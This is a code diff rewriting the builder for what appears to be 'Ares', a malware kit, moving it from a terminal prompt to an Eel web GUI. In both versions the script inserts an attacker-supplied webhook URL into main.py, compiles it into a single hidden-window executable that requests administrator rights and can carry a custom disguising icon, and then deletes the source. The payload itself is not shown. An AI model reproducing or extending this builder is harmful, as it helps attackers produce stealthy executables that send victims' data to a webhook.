@@ -1,105 +1,162 @@
-import colorama
-from colorama import Fore, Back, Style
-import tkinter as tk
-from tkinter import filedialog
+import eel
 import os
 import subprocess
 import sys
 import time
+import threading
+from tkinter import filedialog
+import tkinter as tk
 
-colorama.init(autoreset=True)
+eel.init('web')
 
+icon_path = None
+build_in_progress = False
 
-def main():
-    os.system('cls' if os.name == 'nt' else 'clear')
+@eel.expose
+def configure_webhook_and_build(webhook_url, use_icon):
+    global build_in_progress
     
-    print(f"{Fore.RED}╔══════════════════════════════════════════════════════╗")
-    print(f"{Fore.RED}║ {Fore.CYAN}             ▄▄▄       ██▀███  ▓█████   ██████     {Fore.RED} ║")
-    print(f"{Fore.RED}║ {Fore.CYAN}            ▒████▄    ▓██ ▒ ██▒▓█   ▀ ▒██    ▒     {Fore.RED} ║")
-    print(f"{Fore.RED}║ {Fore.CYAN}            ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   ░ ▓██▄       {Fore.RED} ║")
-    print(f"{Fore.RED}║ {Fore.CYAN}            ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒    {Fore.RED} ║")
-    print(f"{Fore.RED}║ {Fore.CYAN}             ▓█   ▓██▒░██▓ ▒██▒░▒████▒▒██████▒▒    {Fore.RED} ║")
-    print(f"{Fore.RED}║ {Fore.CYAN}             ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░    {Fore.RED} ║")
-    print(f"{Fore.RED}║ {Fore.CYAN}              ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░    {Fore.RED} ║")
-    print(f"{Fore.RED}║ {Fore.CYAN}              ░   ▒     ░░   ░    ░   ░  ░  ░      {Fore.RED} ║")
-    print(f"{Fore.RED}║ {Fore.CYAN}                  ░  ░   ░        ░  ░      ░      {Fore.RED} ║")
-    print(f"{Fore.RED}╚══════════════════════════════════════════════════════╝")
-    print()
+    if build_in_progress:
+        return {"success": False, "message": "Build already in progress"}
     
-    webhook = input(f"{Fore.CYAN}┌─{Fore.RED}root{Fore.WHITE}@{Fore.GREEN}ares{Fore.CYAN}─{Fore.YELLOW}[{Fore.MAGENTA}webhook{Fore.YELLOW}]{Fore.CYAN}─┐\n{Fore.CYAN}└─> {Fore.WHITE}")
-    icon = input(f"{Fore.CYAN}┌─{Fore.RED}root{Fore.WHITE}@{Fore.GREEN}ares{Fore.CYAN}─{Fore.YELLOW}[{Fore.MAGENTA}icon [y/n]{Fore.YELLOW}]{Fore.CYAN}─┐\n{Fore.CYAN}└─> {Fore.WHITE}")
+    build_in_progress = True
     
-    icon_path = None
-    if icon.lower().strip() == "y":
+    try:
+        eel.update_status("Building...")
+        eel.add_console_output("🔧 Starting build process...", "info")
+        
+
+        eel.add_console_output("📝 Configuring webhook...", "info")
+        configure_webhook(webhook_url)
+
+        eel.add_console_output("🔨 Building executable with PyInstaller...", "info")
+        success = build_executable(use_icon)
+        
+        if success:
+            eel.add_console_output("✅ Build completed successfully!", "success")
+            eel.add_console_output("📁 Executable ready in 'dist' folder", "success")
+            eel.update_status("Build Successful")
+            return {"success": True, "message": "Build completed successfully!"}
+        else:
+            eel.add_console_output("❌ Build failed", "error")
+            eel.update_status("Build Failed")
+            return {"success": False, "message": "Build failed"}
+            
+    except Exception as e:
+        error_msg = f"Error: {str(e)}"
+        if sys.exc_info()[2]:
+            error_msg += f" | Line: {sys.exc_info()[2].tb_lineno}"
+        
+        eel.add_console_output(f"❌ {error_msg}", "error")
+        eel.update_status("Error")
+        return {"success": False, "message": error_msg}
+    
+    finally:
+        build_in_progress = False
+
+def configure_webhook(webhook_url):
+    try:
+        with open("main.py", "r", encoding='utf-8') as file:
+            content = file.read()
+
+        configured_content = content.replace('hk = "%WEBHOOK%"', f'hk = "{webhook_url}"')
+
+        with open("main.py", "w", encoding='utf-8') as file:
+            file.write(configured_content)
+            
+        eel.add_console_output("✅ Webhook configured successfully", "success")
+        return True
+        
+    except Exception as e:
+        eel.add_console_output(f"❌ Failed to configure webhook: {e}", "error")
+        return False
+
+def build_executable(use_icon):
+    try:
+        pyinstaller_cmd = [
+            "pyinstaller", 
+            "--onefile", 
+            "--noconsole", 
+            "--uac-admin", 
+            "main.py"
+        ]
+
+        if use_icon and icon_path:
+            pyinstaller_cmd.extend(["--icon", icon_path])
+            eel.add_console_output(f"🎨 Using icon: {os.path.basename(icon_path)}", "info")
+        
+        eel.add_console_output(f"⚡ Running: {' '.join(pyinstaller_cmd)}", "info")
+
+        process = subprocess.run(
+            pyinstaller_cmd, 
+            capture_output=True, 
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
+        )
+
+        if os.path.exists("main.py"):
+            os.remove("main.py")
+            eel.add_console_output("🧹 Cleaned up temporary files", "info")
+
+        if process.returncode == 0:
+            eel.add_console_output("🎉 PyInstaller completed successfully", "success")
+            return True
+        else:
+            eel.add_console_output("❌ PyInstaller failed:", "error")
+            eel.add_console_output(process.stderr, "error")
+            return False
+            
+    except Exception as e:
+        eel.add_console_output(f"❌ Build error: {e}", "error")
+        return False
+
+@eel.expose
+def select_icon():
+    global icon_path
+    
+    def file_dialog():
         root = tk.Tk()
         root.withdraw()
+        root.attributes('-topmost', True)
         
-        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Opening file explorer...")
-        icon_path = filedialog.askopenfilename(
-            title="Select Icon",
-            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
+        file_path = filedialog.askopenfilename(
+            title="Select Icon File",
+            filetypes=[
+                ("Icon files", "*.ico"),
+                ("Image files", "*.png *.jpg *.jpeg"),
+                ("All files", "*.*")
+            ]
         )
         
-        if icon_path:
-            print(f"{Fore.GREEN}[✓] {Fore.WHITE}Icon selected")
-        else:
-            print(f"{Fore.RED}[!] {Fore.WHITE}No icon selected")
-            icon_path = None
+        root.destroy()
+        
+        if file_path:
+            global icon_path
+            icon_path = file_path
+            eel.icon_selected(os.path.basename(file_path))
+            return file_path
+        return None
 
+    thread = threading.Thread(target=file_dialog)
+    thread.daemon = True
+    thread.start()
+
+@eel.expose
+def get_icon_path():
+    return icon_path
+
+@eel.expose
+def clear_console(): 
+    pass  
+
+if __name__ == '__main__':
     try:
-        if os.path.exists("main.py"):
-            encodings = ['utf-8', 'utf-8-sig', 'latin-1', 'cp1252']
-            content = None
-            
-            for encoding in encodings:
-                try:
-                    with open("main.py", "r", encoding=encoding) as file:
-                        content = file.read()
-                    break
-                except UnicodeDecodeError:
-                    continue
-            
-            if content is None:
-                print(f"{Fore.RED}[!] {Fore.WHITE}Cannot read main.py")
-                return
-            
-            mhk = content.replace('hk = "%WEBHOOK%"', f'hk = "{webhook}"')
-            
-            tf = "ares.py"
-            with open(tf, "w", encoding='utf-8') as file:
-                file.write(mhk)
-            
-            print(f"{Fore.GREEN}[✓] {Fore.WHITE}Webhook configured")
-            print(f"{Fore.YELLOW}[*] {Fore.WHITE}Building executable...")
-            
-            pyinstaller_cmd = [
-                "pyinstaller",
-                "--onefile",
-                "--noconsole",
-                "--uac-admin",
-                tf
-            ]
-            
-            if icon_path:
-                pyinstaller_cmd.extend(["--icon", icon_path])
-            
-            process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)
-            
-            if os.path.exists(tf):
-                os.remove(tf)
-            
-            if process.returncode == 0:
-                print(f"{Fore.GREEN}[✓] {Fore.WHITE}Build successful!")
-                print(f"{Fore.GREEN}[✓] {Fore.WHITE}Executable ready in 'dist' folder")
-            else:
-                print(f"{Fore.RED}[!] {Fore.WHITE}Build failed")
-        else:
-            print(f"{Fore.RED}[!] {Fore.WHITE}main.py not found")
-    
+        eel.start('index.html', 
+                 size=(800, 600), 
+                 position=(200, 100),
+                 disable_cache=True,
+                 mode='chrome',
+                 cmdline_args=['--disable-web-security', '--allow-running-insecure-content'])
     except Exception as e:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Error: {str(e)}")
-    
-    input(f"{Fore.CYAN}[*] {Fore.WHITE}Press Enter to exit...")
-
-if __name__ == "__main__":
-    main()
+        print(f"Failed to start GUI: {e}")
+        print("Make sure you have Chrome/Chromium installed or try running with different mode")
